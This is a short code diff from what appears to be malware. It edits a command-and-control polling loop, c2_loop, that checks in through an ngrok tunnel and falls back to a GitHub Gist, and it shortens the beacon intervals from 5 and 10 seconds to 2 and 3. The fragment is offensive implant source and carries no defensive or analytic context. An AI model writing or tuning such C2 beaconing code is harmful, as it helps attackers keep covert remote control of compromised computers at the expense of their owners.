@@ -753,8 +753,8 @@ def c2_loop():
     global _current_ngrok_url
     consecutive_fails = 0
     last_poll_was_ngrok = False
-    ngrok_poll = 5          # Fast polling when ngrok is alive
-    fallback_poll = 10      # Normal polling on Gist
+    ngrok_poll = 2          # Near-instant when ngrok is alive
+    fallback_poll = 3       # Fast polling on Gist
     fail_limit = 3
 
     while True:
